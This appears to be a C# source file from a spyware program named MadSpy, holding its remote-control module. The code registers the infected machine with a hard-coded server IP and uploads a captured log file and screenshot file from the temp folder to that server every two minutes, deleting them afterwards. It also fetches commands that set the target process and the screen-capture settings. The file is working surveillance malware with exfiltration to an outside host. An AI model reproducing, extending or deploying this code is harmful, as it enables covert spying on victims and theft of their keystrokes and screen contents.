﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Threading;
using System.Text.RegularExpressions;

namespace MadSpy
{
    class RemoteController
    {
        public static void FromRemote(Data data) 
        {
            while (true)
            {
                string agent;
                Status status;
                lock (Program.DATALOCK)
                {
                    agent = data.Agent;
                    status = data.Status;
                }

                if (agent.ToUpper().Equals("MADSPY"))
                    InitializeAgent(data);

                string log = Path.GetTempPath() + "log.txt";
                string img = Path.GetTempPath() + "img.html";

                if (status == Status.Active)
                {
                    lock (Program.LOGLOCK)
                    {
                        if (File.Exists(log))
                            FromAgent(data, log);
                        File.Delete(log);
                    }

                    lock (Program.IMGLOCK)
                    {
                        if (File.Exists(img))
                            FromAgent(data, img);
                        File.Delete(img);
                    }
                }

                ToAgent(data);

                Thread.Sleep(120000);
            }
        }

        private static void InitializeAgent(Data data) 
        {
            try
            {
                string response = Get("http://34.253.187.225/initializeagent.php");

                if (!response.Contains("newagent"))
                {
                    Thread.Sleep(300000);

                    InitializeAgent(data);
                }
                else
                    lock (Program.DATALOCK)
                    {
                        data.Agent = Regex.Replace(response.Split(':')[1], @"\r\n?|\n", "");
                    }
            }
            catch (Exception e)
            {
                Thread.Sleep(300000);

                InitializeAgent(data);
            }
        }

        private static void FromAgent(Data data, string file) 
        {
            try
            {
                System.Net.WebClient Client = new System.Net.WebClient();
                Client.Headers.Add("Content-Type", "binary/octet-stream");

                string agent;
                lock (Program.DATALOCK) 
                {
                    agent = data.Agent;
                }

                byte[] result = Client.UploadFile("http://34.253.187.225/" + agent + "/fromagent.php", "POST", file);

                string response = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);

                if (!response.ToUpper().Contains("GOOD JOB AGENT"))
                    throw new Exception();
            }
            catch (Exception e) 
            {
                Thread.Sleep(300000);

                FromAgent(data, file);
            }
        }

        private static void ToAgent(Data data)
        {
            try
            {
                string agent;
                lock (Program.DATALOCK)
                {
                    agent = data.Agent;
                }

                string response = Get("http://34.253.187.225/" + agent + "/toagent.php");

                foreach (string entry in response.Split(';')) 
                {
                    lock (Program.DATALOCK)
                    {
                        switch (entry.Split(':')[0])
                        {
                            case "Status":
                                Status status;
                                Enum.TryParse(entry.Split(':')[1], out status);
                                data.Status = status;
                                break;
                            case "TargetProcess":
                                data.TargetProcess = entry.Split(':')[1];
                                break;
                            case "ScreenCapturerInterval":
                                data.ScreenCapturerInterval = Int32.Parse(entry.Split(':')[1]);
                                break;
                            case "ScreenWidth":
                                data.ScreenWidth = Int32.Parse(entry.Split(':')[1]);
                                break;
                            case "ScreenHeight":
                                data.ScreenHeight = Int32.Parse(entry.Split(':')[1]);
                                break;
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Thread.Sleep(300000);

                ToAgent(data);
            }
        }

        private static string Get(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream stream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
        }

        public string Post(string uri, string data, string contentType, string method = "POST")
        {
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            request.ContentLength = dataBytes.Length;
            request.ContentType = contentType;
            request.Method = method;

            using (Stream requestBody = request.GetRequestStream())
            {
                requestBody.Write(dataBytes, 0, dataBytes.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream stream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
        }
    }
}
